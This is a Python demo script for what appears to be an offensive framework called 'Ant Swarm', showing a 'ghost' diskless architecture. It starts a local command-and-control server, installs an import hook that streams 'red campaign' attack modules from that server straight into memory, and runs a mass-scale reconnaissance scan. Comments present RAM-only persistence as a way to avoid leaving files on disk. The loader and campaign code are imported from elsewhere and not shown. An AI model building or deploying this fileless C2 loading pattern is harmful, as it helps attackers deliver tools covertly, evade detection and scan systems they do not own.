#!/usr/bin/env python3
import sys
import time
import shutil
import os
from rich.console import Console
from rich.panel import Panel

# We need to ensure the modules we want to stream are NOT already imported
# or present in sys.path in a way that bypasses the hook.
# For this demo, we assume the environment is clean or we force it.

console = Console()

def main():
    console.print(Panel("[bold red]ANT SWARM v20: GHOST ARCHITECTURE (DISKLESS)[/]", expand=False))

    # 1. Start the Brain (Server)
    # In a real scenario, this is remote. Here we spin it up locally.
    from ant_swarm.c2.neural_server import NeuralServer
    brain = NeuralServer(port=9090)
    brain.start()
    time.sleep(1)

    # 2. Activate Void Loader (The Client)
    from ant_swarm.c2 import void_loader
    void_loader.install(c2_url="http://localhost:9090")

    # 3. Demonstrate Ephemeral Streaming
    console.print("\n[SCENARIO] 👻 Attempting to use 'Red Campaign' tools...")

    # Crucial: We must remove the local modules from sys.modules if they exist
    # to force the hook to fire.
    for mod in ["ant_swarm.red.campaign", "ant_swarm.red.strategist", "ant_swarm.red.pivot"]:
        if mod in sys.modules:
            del sys.modules[mod]

    # We also temporarily rename the local 'ant_swarm/red' folder to prove we aren't reading disk?
    # No, the Hook takes precedence if insert(0). But let's trust the logs.

    try:
        # Import Trigger
        import ant_swarm.red.campaign
        console.print("[CLIENT] ✅ Import Successful via Stream.")

        # Verify it works
        recon = ant_swarm.red.campaign.AutoRecon(".")
        recon.scan_mass_scale()

    except ImportError as e:
        console.print(f"[CLIENT] ❌ Failed: {e}")

    console.print("\n[SCENARIO] 🛑 Stopping Brain.")
    brain.stop()

    # 4. Prove Fragility (Optional)
    # If we tried to import again without server, it should fail (if not cached)
    # but Python caches modules in sys.modules, so it persists in RAM until process exit.
    # This confirms "Ram Only Persistence".

if __name__ == "__main__":
    main()
